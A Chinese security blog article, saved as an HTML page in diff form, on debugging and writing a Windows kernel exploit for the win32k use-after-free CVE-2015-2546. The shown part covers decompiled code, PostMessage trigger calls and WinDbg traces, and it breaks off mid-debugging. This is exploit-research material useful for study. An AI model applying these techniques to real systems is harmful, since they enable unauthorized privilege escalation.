@@ -1,0 +1,1010 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns:wb="http://open.weibo.com/wb" xml:lang="en" lang="en">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+    <meta name="viewport"
+          content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no"/>
+    <link rel="shortcut icon" href="http://bobao.360.cn/favicon.ico?v=1.1"/>
+    <link rel="alternate" title="安全资讯" href="/rss?type=news" type="application/rss+xml"/>
+    <link rel="alternate" title="安全知识" href="/rss?type=learning" type="application/rss+xml"/>
+    <link rel="alternate" title="安全圈活动" href="/rss?type=activity" type="application/rss+xml"/>
+    <link rel="alternate" title="所有漏洞" href="/rss?type=vul" type="application/rss+xml"/>
+    <link rel="alternate" title="通用型漏洞" href="/rss?type=commonvul" type="application/rss+xml"/>
+    <link rel="alternate" title="事件型漏洞" href="/rss?type=eventvul" type="application/rss+xml"/>
+    <link rel="alternate" title="热门漏洞" href="/rss?type=hotvul" type="application/rss+xml"/>
+
+        <title>【技术分享】经典内核漏洞调试笔记之二 - 安全客 - 有思想的安全新媒体</title>
+    
+        <meta name="keywords" content="内核漏洞,漏洞分析,CVE-2015-2546,二进制漏洞挖掘,系统安全"/>
+    
+        <meta name="description" content="根据这篇分析，我尝试编写了一下Exploit，这一次真的是非常艰辛，一边逆向调试，一边编写Exploit，磕磕绊绊完成了这个漏洞的利用，在调试过程中，有好多非常有意思的过程，所以总结了一下，拿出来和大家一起分享。"/>
+        <meta property="wb:webmaster" content="224437c7be31d633"/>
+
+    <script type="text/javascript" src="http://s7.qhimg.com/!56caa871/xpc_sync_height.js"></script>
+    <link rel="stylesheet" type="text/css" href="/css/reset.css" />
+    <link rel="stylesheet" type="text/css" href="/css/common_new.css?v=4.4.2.1" />
+    <link rel="stylesheet" type="text/css" href="/css/jquery.notyfy.css" />
+    <link rel="stylesheet" type="text/css" href="/css/notyfy.theme.default.css" />
+    <link rel="stylesheet" type="text/css" href="/css/s_common.css?v=2.2.7" media="only screen and
+    (max-device-width:900px), only screen and (max-width:900px)" />
+    <script type="text/javascript" src="/js/jquery.min.js?v=3.1"></script>
+    <script type="text/javascript" src="/js/jquery.notyfy.js"></script>
+    <script type="text/javascript" src="/js/iscroll.js"></script>
+    <script src="http://js.passport.qihucdn.com/5.0.3.js"></script>
+    <script type="text/javascript">
+        var myScroll, myNavScroll;
+
+        function iscrollLoaded() {
+            myScroll = new IScroll('#wrapper',
+                {
+                    scrollX: true,
+                    scrollY: false,
+                    bounceEasing: 'circular',
+                    eventPassthrough: true,
+                    preventDefault: false,
+                    bounceTime: 500
+                }
+            );
+        }
+
+        $(function () {
+
+            //导航横向滚动
+
+
+            function setNavWidth() {
+
+                /* 计算导航宽度 */
+                var allWidth = $(window).width();
+                var scroller = $('#scroller');
+
+                if (allWidth > 900) {
+                    scroller.find('ul').add(scroller.find('.scroll')).removeAttr('style');
+                    scroller.css('overflow', 'visible');
+                    if (myNavScroll) myNavScroll.destroy();
+                } else {
+
+                    var width = 0;
+                    scroller.find('.scroll').children('ul').children('li').each(function (index, el) {
+                        if (!$(this).hasClass('mobile-hide')) {
+                            width += $(this).outerWidth();
+                        }
+                    });
+                    scroller.find('ul').add(scroller.find('.scroll')).width(width);
+
+                    if (myNavScroll) myNavScroll.destroy();
+
+                    myNavScroll = new IScroll('#scroller', {
+                        scrollX: true,
+                        scrollY: false,
+                        momentum: false,
+                        click: true
+                    });
+
+                }
+
+            }
+
+            setNavWidth();
+            $(window).resize(function (event) {
+                setNavWidth();
+            });
+
+        });
+
+    </script>
+</head>
+<body onload="iscrollLoaded();">
+<div style='margin:0 auto;width:0px;height:0px;overflow:hidden;'>
+    <img src=""/>
+</div>
+
+<div id="is-mobile"></div>
+<div class="container">
+        <div class="mobile-header">
+        <div class="header clearfix">
+            <div class="header-wrapper clearfix">
+                <a href="/index/index" class="logo"><img class="slogan" src="/img/logo.png?v=1.5"/></a>
+                                <form id="search" class="search-box" action="/search/index" method="GET">
+                    <input class="keys" name="keywords" type="text" placeholder="搜索漏洞" required="required">
+                    <input class="icon" type="submit" value="">
+                    <input type="hidden" name="type" value=""/>
+                </form>
+                <div class="bug">
+                    <div class="name"><span class="seled">全部</span><i class="arrow"></i></div>
+                    <ul class="typelist">
+                        <li data-index="3"><a href="javascript:void(0);">全部</a></li>
+                        <li data-index="0"><a href="javascript:void(0);">漏洞</a></li>
+                        <li data-index="1"><a href="javascript:void(0);">资讯</a></li>
+                        <li data-index="2"><a href="javascript:void(0);">知识</a></li>
+                    </ul>
+                </div>
+                                <div class="logNreg mobile-hide">
+                    <div class="unlog">
+                        <i></i>
+                        <a href="log.html" class="log">登录</a>
+                        <span>|</span>
+                        <a href="reg.html" class="reg">注册</a>
+                    </div>
+                    <div class="loged">
+                        <a href="/member/profile" class="user-center"><i></i><span class="user-name-tag">个人中心</span></a>
+                        <div class="user-links">
+                            <span class="arrow"></span>
+                            <ul>
+                                <li class="account-setting"><a href="http://i.360.cn/profile/accountmanage"
+                                                               target="_blank"><i></i><span>账号设置</span></a></li>
+                                <li class="alert-setting"><a href="/keywords/index"
+                                                             target="_blank"><i></i><span>告警设置</span></a></li>
+                                <li class="bug-alert"><a href="/myalarm/index" target="_blank"><i></i><span>漏洞告警</span></a>
+                                </li>
+                                <li class="my-knowl"><a href="/mylearn/index" target="_blank"><i></i><span>我的知识</span></a>
+                                </li>
+                                <li class="my-knowl"><a href="/mycourse/index" target="_blank"><i></i><span>我的课堂</span></a>
+                                </li>
+                                <li class="my-exit"><a
+                                            href="http://login.360.cn/?src=pcw_adlab&op=logout&destUrl=http://bobao.360.cn"><i></i><span>退出系统</span></a>
+                                </li>
+                            </ul>
+                        </div>
+
+                        <a href="/message" class="message-center" target="_blank"><i></i><span>我的消息</span></a>
+                        <div class="message-links">
+                            <span class="arrow"></span>
+                            <ul>
+                                <li class="account-setting" style="display:none;"><a href="/myres/index"
+                                                                                     target="_blank"><i></i><span>回复我的</span></a>
+                                </li>
+                                <li class="my-bug"><a href="/myvul/index"
+                                                      target="_blank"><i></i><span>我的漏洞</span></a></li>
+                                <!--<li class="my-bug"><a href="/myres/index" target="_blank"><i></i><span>我的评论</span></a></li>-->
+                                <!--<li class="alert-setting"><a href="###" target="_blank"><i></i><span>提到我的</span></a>
+                                </li>-->
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <style type="text/css">
+            .nav {
+                overflow: hidden;
+            }
+
+            .nav .scroll {
+                width: auto;
+            }
+        </style>
+        <div id="wrapper">
+            <div id="scroller" class="nav">
+                <div class="scroll">
+                    <ul class="nav-list">
+                        <li ><a class="link-nav"
+                                                                                 href="/index/index">首页</a>
+                        </li>
+                        <li >
+                        <a class="link-nav" href="/vul/index">漏洞</a>
+                        </li>
+                        <li >
+                        <a class="link-nav" href="/introduce/list">招聘</a>
+                        </li>
+                        <li >
+                        <a class="link-nav" href="/news/index">资讯</a><!--<i class="arrow mobile-hide"></i>
+                        <ul class="subnav-list mobile-hide">
+                            <li><a class="link-subnav" href="/introduce/list">招聘</a></li>
+                        </ul>
+			-->
+                        </li>
+                        <li class="cur">
+                        <a class="link-nav" href="/learning/index">知识</a><i class="arrow mobile-hide"></i>
+                        <ul class="subnav-list mobile-hide">
+                            <li><a class="link-subnav" href="/course/index">学院</a></li>
+                        </ul>
+                        </li>
+                        <li ><a class="link-nav"
+                                                               href="/activity/index">活动</a></li>
+                        <li class="mobile-hide "><a class="link-nav"
+                                                                                                   href="/ctf/index">CTF训练营</a>
+                        </li>
+                        <li ><a class="link-nav"
+                                                               href="/interref/list">安全内参</a></li>
+                        <li ><a class="link-nav" href="/app/index">APP</a></li>
+
+                        <!--<li ><a href="/course/index">学院</a></li>-->
+                        <!--<li ><a href="/introduce/list">招聘</a></li>-->
+                        <!--<li  class="mobile-hide"><a href="/ctf/index">CTF训练营</a></li>-->
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <div class="mobile-content">
+        <link rel="stylesheet" type="text/css" href="/css/news.css?v=3.5" />
+<link rel="stylesheet" type="text/css" href="/ue/SyntaxHighlighter/shCoreDefault.css?v=1.0" />
+<style>
+    p .syntaxhighlighter {
+        width: 80%;
+    }
+</style>
+
+<div class="cur-pos w1000">当前位置：<a href="http://bobao.360.cn/">安全客</a> &gt;&gt; 知识详情</div>
+
+<div class="content clearfix">
+    <div class="main">
+        <div class="article">
+            <div id="article_box">
+                <h2>【技术分享】经典内核漏洞调试笔记之二</h2>
+                <div class="article-msg">
+                    <span class="time">2016-11-15 10:45:29</span>
+                    
+                                        <span class="read">阅读：17002次</span>
+                    <span><a style="display: none;" class="good" href="javascript:;"
+                             data-target="/learning/good" data-value="g_3184"
+                             data-type="learning">点赞(0)</a></span>
+                    <span><a class="fav" href="javascript:;" data-target="/mylearning/add"
+                             data-pk="3184" data-type="learning">收藏</a></span>
+                                        <span><a style="margin-left: 4px;" class="fav" href=""
+                             target="_blank">来源： 安全客</a></span>
+                    
+                    
+                    <div style="margin-top:10px; ">
+                        <a href="/member/contribute?uid=1353169030" style="color:#848e99;">
+                            <img src="http://p1.qhmsg.com/dm/150_150_100/t01acaeca3752f24139.jpg" data-is-avatar="true"
+                                 style="border: 1px solid #d5d5d5;padding: 2px; width: 80px;height: 80px;border-radius: 43px;"/>
+                        </a>
+
+                    </div>
+                    <span class="orig">作者：<a href="/member/contribute?uid=1353169030" style="color:#848e99;">k0shl</a></span>
+                                    </div>
+                <hr size="1">
+                <div class="article-msg">
+                    <p><!-- JiaThis Button BEGIN -->
+
+<!--
+<span class="jiathis_style"><span class="jiathis_txt">分享到：</span>
+	<a class="jiathis_button_weixin"></a>
+	<a class="jiathis_button_tsina"></a>
+    <a class="jiathis_button_tqq"></a>
+    <a class="jiathis_button_qzone"></a>
+    <a class="jiathis_button_renren"></a>
+    <a class="jiathis_button_xiaoyou"></a>
+    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
+</span>
+
+-->
+</p>
+                </div>
+                <p><p style="text-align: center; text-indent: 0em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><img src="http://p6.qhimg.com/t01d6bcb550ea8df596.jpg" title="t01e69be8b6bfe3731d.jpg" alt="http://p9.qhimg.com/t01e69be8b6bfe3731d.jpg"/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></strong></span></p><p style="white-space: normal; text-indent: 2em;"><span style="color: rgb(0, 112, 192);"><strong><span style="font-size: 18px; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">作者：</span></strong></span><a href="http://bobao.360.cn/member/contribute?uid=1353169030" target="_blank" textvalue="k0pwn_ko" style="text-decoration: none;"><span style="color: rgb(0, 112, 192);"><strong><span style="font-size: 18px; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">k0pwn_ko</span></strong><strong><span style="font-size: 18px; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></strong></span></a></p><p style="white-space: normal; text-indent: 2em;"><span style="color: rgb(0, 112, 192);"><strong><span style="font-size: 18px; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">稿费：500RMB（不服你也来投稿啊！）</span></strong></span></p><p style="white-space: normal; text-indent: 2em;"><span style="color: rgb(0, 112, 192);"><strong><span style="font-size: 18px; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">投稿方式：发送邮件至linwei#360.cn，或登陆<strong><strong><strong><strong><a href="http://bobao.360.cn/contribute/index" target="_blank" style="text-decoration: none;"><span style="color: rgb(0, 112, 192);"><strong>网页版</strong></span></a></strong></strong></strong></strong></span></strong></span><span style="color: rgb(0, 112, 192); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px;"><strong>在线投稿</strong></span></p><p style="text-indent: 2em; text-align: left;"><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px; color: rgb(0, 112, 192);"><strong>传送门</strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><a href="http://bobao.360.cn/learning/detail/3170.html" target="_blank" style="text-decoration: none;"><strong style="color: rgb(0, 112, 192); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px; text-indent: 2em;">【技术分享】经典内核漏洞调试笔记</strong><strong style="color: rgb(0, 112, 192); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px; text-indent: 2em;"></strong></a></p><p style="text-indent: 2em; text-align: left;"><strong style="color: rgb(0, 112, 192); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px; text-indent: 2em;"><br/></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">前言</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="text-indent: 2em; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">上一次我发了一篇自己在一个经典内核漏洞CVE-2014-4113中挣扎的经历，以及一些调试细节的分享：</span><a href="http://bobao.360.cn/learning/detail/3170.html" _src="http://bobao.360.cn/learning/detail/3170.html" style="text-indent: 2em; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-decoration: none;">http://bobao.360.cn/learning/detail/3170.html</a></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">总结过后感觉自己收获很多，后来一个偶然的机会，我看到了百度安全实验室发的一篇文章，是关于另一个经典的内核漏洞，也就是今天的主角----CVE-2015-2546这个漏洞的从补丁对比到Exploit的分析：</span><a href="http://xlab.baidu.com/cve-2015-2546%ef%bc%9a%e4%bb%8e%e8%a1%a5%e4%b8%81%e6%af%94%e5%af%b9%e5%88%b0exploit/" _src="http://xlab.baidu.com/cve-2015-2546%ef%bc%9a%e4%bb%8e%e8%a1%a5%e4%b8%81%e6%af%94%e5%af%b9%e5%88%b0exploit/" style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-decoration: none;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">http://xlab.baidu.com/cve-2015-2546%ef%bc%9a%e4%bb%8e%e8%a1%a5%e4%b8%81%e6%af%94%e5%af%b9%e5%88%b0exploit/</span></a></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">同样感觉收获满满，<span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(255, 0, 0);">在这篇分析中，总结了漏洞的成因，以及构造还原的手法，受益匪浅，但是并没有提供Exploit，于是根据这篇分析，我尝试编写了一下Exploit，</span>这一次真的是非常艰辛，一边逆向调试，一边编写Exploit，磕磕绊绊完成了这个漏洞的利用，但和我的上一篇分析一样，在调试过程中，有好多非常有意思的过程，所以总结了一下，拿出来和大家一起分享。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">下面开始我这只小菜鸟的提权之旅。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-size: 18px; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">从CVE-2014-4113到CVE-2015-2546</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">首先我来描述一下这个漏洞的过程：在创建弹出菜单之后，当进行鼠标操作的时候会触发鼠标事件，引发win32k.sys下的一个叫做MNMouseMove的函数，在这个函数的处理过程中会涉及到一个叫做MNHideNextHierarchy的函数，这个函数会传入一个参数，这个参数是一个名为tagPOPUPMENU的结构体对象，由于对于这个对象没有进行检查，导致可以通过前面的SendMessage异步的方法，使用将这个对象释放掉，然后使用一个fake_tag进行占位，从而将这个fake_tag传入MNHideNextHierarchy，在这个函数中会处理一个1E4消息，在这里由于fake_tag的关系，导致释放后重用，从而引发在Ring0层执行Shellcode，最后完成提权。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">第一次看到这个漏洞的时候，我就觉得这个利用的过程和CVE-2014-4113非常相像，都是在SendMessage中完成的利用，也就是利用的call [esi+60h]这个汇编指令。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">要想触发这个漏洞，首先要想办法执行到MNMouseMove，我们一起来分析一下从哪里能够执行到MNMouseMove。</span></p><p style="text-align:center"><img src="http://p3.qhimg.com/t0130cb3ac8f445d742.png" title="t01017ec0e7a94881ea.png" alt="http://p2.qhimg.com/t01017ec0e7a94881ea.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这个过程是不是非常熟悉，从TrackPopupMenuEx到MNLoop，到HandleMenuMessages，最后到MNMouseMove。我们上一篇调试CVE-2014-4113就是这个过程，上一个漏洞发生在HandleMenuMessage中，而CVE-2015-2546发生在HandleMenuMessages里面的另一个调用，那么我就产生了一个想法，CVE-2014-4113的Exploit我们是否能在这个漏洞里使用呢？（事后证明，想的容易，做起来难，不过过程很有意思。）我们就从CVE-2014-4113这个Exploit入手，来完成CVE-2015-2546的提权。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-size: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-size: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">和内核对抗的日子</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-size: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">首先我们来看一下CVE-2014-4113和CVE-2015-2546有多少关系，相关内容，可以看一下注释。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">if&nbsp;(&nbsp;v5&nbsp;&gt;&nbsp;0x104&nbsp;)
+&nbsp;&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;v5&nbsp;&gt;&nbsp;0x202&nbsp;)
+&nbsp;&nbsp;&nbsp;&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;……
+&nbsp;&nbsp;&nbsp;&nbsp;}
+&nbsp;&nbsp;&nbsp;&nbsp;……
+&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;v20&nbsp;)
+&nbsp;&nbsp;&nbsp;&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v21&nbsp;=&nbsp;v20&nbsp;-&nbsp;1;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;v21&nbsp;)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;……
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v13&nbsp;=&nbsp;xxxMNFindWindowFromPoint(v3,&nbsp;(int)&amp;UnicodeString,&nbsp;(int)v7);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v52&nbsp;=&nbsp;IsMFMWFPWindow(v13);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;v52&nbsp;)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;……
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;v13&nbsp;==&nbsp;-1&nbsp;)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;xxxMNButtonDown((PVOID)v3,&nbsp;v12,&nbsp;UnicodeString,&nbsp;1);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;xxxSendMessage((PVOID)v13,&nbsp;-19,&nbsp;UnicodeString,&nbsp;0);//&nbsp;CVE&nbsp;-2014-4113的漏洞位置
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;!(*(_DWORD&nbsp;*)(v12&nbsp;+&nbsp;4)&nbsp;&amp;&nbsp;0x100)&nbsp;)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;xxxMNRemoveMessage(*(_DWORD&nbsp;*)(a1&nbsp;+&nbsp;4),&nbsp;516);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;0;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;goto&nbsp;LABEL_59;
+&nbsp;&nbsp;&nbsp;&nbsp;}
+&nbsp;&nbsp;&nbsp;&nbsp;……
+LABEL_59:
+&nbsp;&nbsp;&nbsp;&nbsp;……
+&nbsp;&nbsp;&nbsp;&nbsp;xxxMNMouseMove(v3,&nbsp;a2,&nbsp;(int)v7);&nbsp;//&nbsp;CVE-2015-2546漏洞位置
+&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;1;
+&nbsp;&nbsp;}
+}</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">可以看到，两个漏洞的位置都处于HandleMenuMessages的函数中，经过CVE-2014-4113的分析，我们发现这个过程需要通过调用PostMessage的函数，这涉及到对窗口的操作，在CVE-2014-4113中，通过WNDCLASS类中的lpfnWndProc定义了回调函数MyWndProc负责处理窗口函数，这里使用的PostMessage的方法。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这样的话，为了使程序执行到MNMouseMove，我需要设定一个鼠标事件，这里的灵感来源于百度实验室的分析文章，所以我考虑使用。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">//WM_SYSCOMMAND处理消息
+PostMessage(hwnd,WM_SYSCOMMAND,0,0);//发送WM_SYSCOMMAND
+//鼠标事件
+PostMessage(hwnd,WM_LBUTTONDOWN,0,0);//鼠标左键按下
+PostMessage(hwnd,WM_LBUTTONUP,0,0);//鼠标左键抬起</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">但是经过调试，我发现无论如何也到达不了调试位置，这样我需要考虑为何无法到达调试位置，在分析的过程中发现了一个有趣的事情，首先，在CVE-2014-4113中，使用TrackPopupMenu会创建一个弹出窗口菜单。</span></p><p style="text-align:center"><img src="http://p5.qhimg.com/t01eb7e88a5669c007b.png" title="t014bf44b6e02c871bf.png" alt="http://p3.qhimg.com/t014bf44b6e02c871bf.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">但是，当修改了MyWndProc变成我们设定的事件之后，窗口菜单弹出后就没有后续动作了，也就是说，没有进入MNMouseMove的处理过程，但是当我把鼠标挪到上图的菜单中时，我们首先命中了HandleMenuMessages断点，紧接着命中了MNMouseMove。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">kd&gt;&nbsp;g
+Breakpoint&nbsp;6&nbsp;hit
+win32k!xxxHandleMenuMessages:
+90668d78&nbsp;8bff&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;edi,edi
+kd&gt;&nbsp;g
+Breakpoint&nbsp;4&nbsp;hit
+win32k!xxxMNMouseMove:
+906693ef&nbsp;8bff&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;edi,edi</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">这说明在鼠标挪上去后在HandleMenuMessages中发生的事情能够使程序最后进入MNMouseMove，分析一下这个过程。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">kd&gt;&nbsp;p
+win32k!xxxHandleMenuMessages+0x1b:
+90668d93&nbsp;8b7508&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;esi,dword&nbsp;ptr&nbsp;[ebp+8]
+kd&gt;&nbsp;p
+win32k!xxxHandleMenuMessages+0x1e:
+90668d96&nbsp;8b4604&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,dword&nbsp;ptr&nbsp;[esi+4]
+kd&gt;&nbsp;p
+win32k!xxxHandleMenuMessages+0x21:
+90668d99&nbsp;8b5608&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;edx,dword&nbsp;ptr&nbsp;[esi+8]
+kd&gt;&nbsp;r&nbsp;eax
+eax=00000200</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">可以发现，程序进入后，会传递一个值0x200，这个值会在随后的过程中连续传递并且判断并且跳转，这个过程不再详细跟踪，举两个跳转的例子。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">//一处跳转，0x200和0x104作比较
+kd&gt;&nbsp;p
+win32k!xxxHandleMenuMessages+0x2f:
+90668da7&nbsp;895dfc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dword&nbsp;ptr&nbsp;[ebp-4],ebx
+kd&gt;&nbsp;p
+win32k!xxxHandleMenuMessages+0x32:
+90668daa&nbsp;3bc1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cmp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,ecx
+kd&gt;&nbsp;r&nbsp;eax
+eax=00000200
+kd&gt;&nbsp;r&nbsp;ecx
+ecx=00000104
+kd&gt;&nbsp;p
+win32k!xxxHandleMenuMessages+0x34:
+90668dac&nbsp;0f87e4010000&nbsp;&nbsp;&nbsp;&nbsp;ja&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;win32k!xxxHandleMenuMessages+0x21d&nbsp;(90668f96)
+//另一处跳转，0x200和0x202作比较
+kd&gt;&nbsp;p
+win32k!xxxHandleMenuMessages+0x21d:
+90668f96&nbsp;b902020000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ecx,202h
+kd&gt;&nbsp;p
+win32k!xxxHandleMenuMessages+0x222:
+90668f9b&nbsp;3bc1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cmp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,ecx
+kd&gt;&nbsp;p
+win32k!xxxHandleMenuMessages+0x224:
